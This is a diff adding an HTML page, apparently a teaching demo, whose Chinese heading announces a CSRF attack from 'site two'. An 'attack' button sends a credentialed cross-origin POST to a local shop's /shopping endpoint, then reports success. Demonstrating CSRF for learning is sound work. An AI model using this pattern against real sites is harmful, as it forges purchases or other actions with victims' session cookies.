@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <h1>这是网站二 我要在这进行CSRF攻击</h1>
+    <button onclick="csrf()">攻击</button>
+    <script>
+      const url = "http://localhost:3002/"
+      function csrf() {
+        // 向http://localhost:3002发送购物请求
+        request({
+          path:"shopping",
+          method:"post"
+        }).then((res) => {
+          console.log(res);
+          alert("攻击成功! 现在返回商品页面刷新")
+        });
+      }
+      // 封装ajax请求
+      function request(options) {
+        const { path, method, data } = options;
+        return new Promise((resolve, reject) => {
+          var xhr = new XMLHttpRequest();
+          // 允许浏览器发送cookie
+          xhr.withCredentials = true;
+          xhr.open(method, url + path);
+          xhr.onreadystatechange = function () {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+              resolve(xhr.response);
+            } else if (xhr.status !== 200) {
+              reject(xhr.status);
+            }
+          };
+          xhr.send(JSON.stringify(data));
+        });
+      }
+    </script>
+  </body>
+</html>
